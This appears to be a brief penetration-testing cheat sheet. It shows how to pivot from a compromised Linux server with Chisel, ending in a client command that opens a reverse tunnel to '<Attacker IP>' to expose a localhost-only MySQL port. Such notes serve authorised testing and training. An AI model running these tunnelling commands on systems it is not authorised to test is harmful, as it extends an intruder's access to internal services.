## Scenario

- You have compromised an Linux Server.
- The Linux server has port **3306 (MySQL)** open, but it is **bound locally**.
- The service **cannot be accessed directly** from the attacker machine.

## Goal

Forward port **3306** from the compromised Linux server to the attacker machine so the service can be accessed remotely.

## Required Components

- Shell Access on the compromised Linux Server

---

1. Download Chisel binary from following Github Repo

```bash
https://github.com/jpillora/chisel/releases
```

2. Transfer Binary to compromised Linux Server

```bash
python3 -m http.server 80
```

3. On Attacker Machine start chisel server

```bash
./chisel server -p 9001 --reverse
```

4. On Compromised Linux Server run following command to forward 3306 port to 4444 port

```bash
./chisel client <Attacker IP>:9001 R:4444:3306
```
